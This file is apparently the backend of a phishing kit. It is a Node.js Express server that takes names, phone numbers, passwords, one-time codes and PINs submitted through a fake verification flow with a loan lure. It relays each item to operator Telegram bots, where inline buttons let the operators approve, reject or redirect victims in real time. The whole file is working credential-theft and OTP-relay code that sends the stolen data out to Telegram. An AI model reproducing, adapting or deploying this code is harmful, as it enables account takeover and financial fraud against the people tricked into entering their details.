require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = process.env.BACKEND_DOMAIN;

// ---------------- MEMORY STORES ----------------
const passwordRequests = {};
const otpRequests = {};
const pinRequests = {};
const blockedRequests = {};
const requestMeta = {};
const loanRequests = {}; // retain your loan store

// ---------------- MULTI-BOT STORE ----------------
const bots = [];
Object.keys(process.env).forEach(key => {
  const match = key.match(/^BOT(\d+)_TOKEN$/);
  if (!match) return;
  const i = match[1];
  const token = process.env[`BOT${i}_TOKEN`];
  const chatId = process.env[`BOT${i}_CHATID`];
  if (token && chatId) bots.push({ botId: `bot${i}`, token, chatId });
});
console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json({ type: '*/*' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- DEBUG ROUTE ----------------
app.get('/debug/bot', (req, res) => {
  res.json({
    count: bots.length,
    bots: bots.map(b => ({ botId: b.botId, chatId: b.chatId }))
  });
});

// ---------------- BOT ENTRY ----------------
app.get('/bot/:botId', (req, res) => {
  const bot = bots.find(b => b.botId === req.params.botId);
  if (!bot) return res.status(404).send('Invalid bot');
  res.redirect(`/index.html?botId=${bot.botId}`);
});

// ---------------- HELPERS ----------------
function getBot(botId) {
  return bots.find(b => b.botId === botId);
}

async function sendTelegram(bot, text, buttons = []) {
  try {
    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
      chat_id: bot.chatId,
      text,
      reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
    });
  } catch (e) {
    console.error('❌ Telegram error:', e.response?.data || e.message);
  }
}

async function answerCallback(bot, id) {
  try {
    await axios.post(
      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
      { callback_query_id: id }
    );
  } catch {}
}

// ---------------- WEBHOOKS ----------------
async function setWebhook(bot) {
  if (!DOMAIN) return;
  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
  try {
    await axios.get(
      `https://api.telegram.org/bot${bot.token}/setWebhook?url=${url}`
    );
    console.log(`✅ Webhook set for ${bot.botId}`);
  } catch (e) {
    console.error('❌ Webhook error:', e.response?.data || e.message);
  }
}

async function setAllWebhooks() {
  for (const bot of bots) await setWebhook(bot);
}

// ---------------- PASSWORD STEP ----------------
app.post('/submit-password', (req, res) => {
  try {
    const { name, phone, password, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    passwordRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    sendTelegram(
      bot,
      `🔐 DETAILS VERIFICATION
👤 Name: ${name}
📞 Phone: ${phone}
🔑 Password: ${password}
🆔 Ref: ${requestId}`,
      [
        [
          { text: '🔢 5 Digit OTP', callback_data: `pass_5:${requestId}` },
          { text: '🔢 6 Digit OTP', callback_data: `pass_6:${requestId}` }
        ],
        [
          { text: '❌ Wrong Details', callback_data: `pass_bad:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-password/:id', (req, res) => {
  const result = passwordRequests[req.params.id] ?? null;
  if (result === '5') return res.json({ redirect: 'code2' });
  if (result === '6') return res.json({ redirect: 'code' });
  if (result === false) return res.json({ approved: false });
  res.json({ approved: null });
});

// ---------------- OTP STEP ----------------
app.post('/submit-otp', (req, res) => {
  try {
    const { name, phone, otp, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    otpRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    const buttons = [
      [
        { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
        { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
      ]
    ];
    if (otp.length === 5) {
      buttons.push([
        { text: '6-Digit OTP', callback_data: `otp_6:${requestId}` }
      ]);
    }

    sendTelegram(
      bot,
      `🔐 OTP VERIFICATION
👤 Name: ${name}
📞 Phone: ${phone}
🔢 OTP: ${otp}
🆔 Ref: ${requestId}`,
      buttons
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-otp/:id', (req, res) => {
  res.json({ approved: otpRequests[req.params.id] ?? null });
});

// ---------------- PIN STEP ----------------
app.post('/submit-pin', (req, res) => {
  try {
    const { name, phone, pin, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    const requestId = uuidv4();
    pinRequests[requestId] = null;
    requestMeta[requestId] = { name, phone, botId };

    sendTelegram(
      bot,
      `🔐 PIN VERIFICATION
👤 Name: ${name}
📞 Phone: ${phone}
🔢 PIN: ${pin}
🆔 Ref: ${requestId}`,
      [
        [
          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` },
          { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
        ]
      ]
    );

    res.json({ requestId });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-pin/:id', (req, res) => {
  if (blockedRequests[req.params.id]) return res.json({ blocked: true });
  res.json({ approved: pinRequests[req.params.id] ?? null });
});

// ---------------- LOAN STEP (already in your current server) ----------------
app.post('/submit-loan', async (req, res) => {
  try {
    const { name, phone, amount, reference, botId } = req.body;
    const bot = getBot(botId);
    if (!bot) return res.status(400).json({ error: 'Invalid bot' });

    loanRequests[reference] = null; // pending

    const buttons = [
      [
        { text: '✅ Approve Loan', callback_data: `loan_approve:${reference}` },
        { text: '❌ Reject Loan', callback_data: `loan_reject:${reference}` }
      ]
    ];

    await sendTelegram(
      bot,
      `💰 NEW LOAN REQUEST
👤 Name: ${name}
📞 Phone: ${phone}
💵 Amount: ${amount}
🆔 Ref: ${reference}`,
      buttons
    );

    res.json({ status: 'sent' });
  } catch {
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/check-loan/:reference', (req, res) => {
  res.json({ approved: loanRequests[req.params.reference] ?? null });
});

// ---------------- TELEGRAM CALLBACK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
  const bot = getBot(req.params.botId);
  if (!bot) return res.sendStatus(404);

  const cb = req.body.callback_query;
  if (!cb) return res.sendStatus(200);

  const [action, requestId] = cb.data.split(':');
  const meta = requestMeta[requestId];

  let feedback = '';

  // PASSWORD DECISION
  if (action === 'pass_5') { passwordRequests[requestId] = '5'; feedback = '🔢 Redirected to 5 Digit OTP'; }
  if (action === 'pass_6') { passwordRequests[requestId] = '6'; feedback = '🔢 Redirected to 6 Digit OTP'; }
  if (action === 'pass_bad') { passwordRequests[requestId] = false; feedback = '❌ Details rejected'; }

  // OTP DECISION
  if (action === 'otp_ok') { otpRequests[requestId] = true; feedback = '✅ OTP approved'; }
  if (action === 'otp_bad') { otpRequests[requestId] = false; feedback = '❌ OTP rejected'; }
  if (action === 'otp_6') { otpRequests[requestId] = '6'; feedback = '🔢 6-Digit OTP selected'; }

  // PIN DECISION
  if (action === 'pin_ok') { pinRequests[requestId] = true; feedback = '✅ PIN approved'; }
  if (action === 'pin_bad') { pinRequests[requestId] = false; feedback = '❌ PIN rejected'; }
  if (action === 'pin_block') { blockedRequests[requestId] = true; feedback = '🛑 User blocked'; }

  // LOAN DECISION
  if (action === 'loan_approve') { loanRequests[requestId] = true; feedback = '✅ Loan approved'; await sendTelegram(bot, `✅ Loan approved for Ref: ${requestId}`); }
  if (action === 'loan_reject') { loanRequests[requestId] = false; feedback = '❌ Loan rejected'; await sendTelegram(bot, `❌ Loan rejected for Ref: ${requestId}`); }

  if (feedback && meta) {
    await sendTelegram(
      bot,
      `📝 ACTION TAKEN
👤 Name: ${meta.name || '—'}
📞 Phone: ${meta.phone || '—'}
${feedback}`
    );
  }

  await answerCallback(bot, cb.id);
  res.sendStatus(200);
});

// ---------------- START SERVER ----------------
setAllWebhooks().then(() => {
  app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
});